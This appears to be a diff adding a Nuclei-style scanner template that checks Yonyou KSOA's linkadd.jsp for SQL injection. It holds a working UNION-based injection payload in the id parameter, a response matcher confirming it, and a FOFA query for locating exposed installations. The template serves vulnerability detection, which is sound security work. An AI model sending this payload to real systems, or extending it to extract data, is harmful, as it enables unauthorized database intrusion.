@@ -1,0 +1,23 @@
+id: yonyou-ksoa-linkadd-sqli
+
+info:
+  name: yonyou-ksoa-linkadd-sqli
+  author: unknow
+  severity: high
+  description: yonyou ksoa linkadd 存在sqli漏洞
+  tags:  yonyou,sqli
+  metadata:
+    fofa-qeury: app="用友-时空KSOA"
+
+http:
+  - raw:
+      - |              
+        GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27c4Bd4cfc67c75DA6%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "ecc55543f45dbfa5253122570d4066c5") && contains(header, "text/html")'
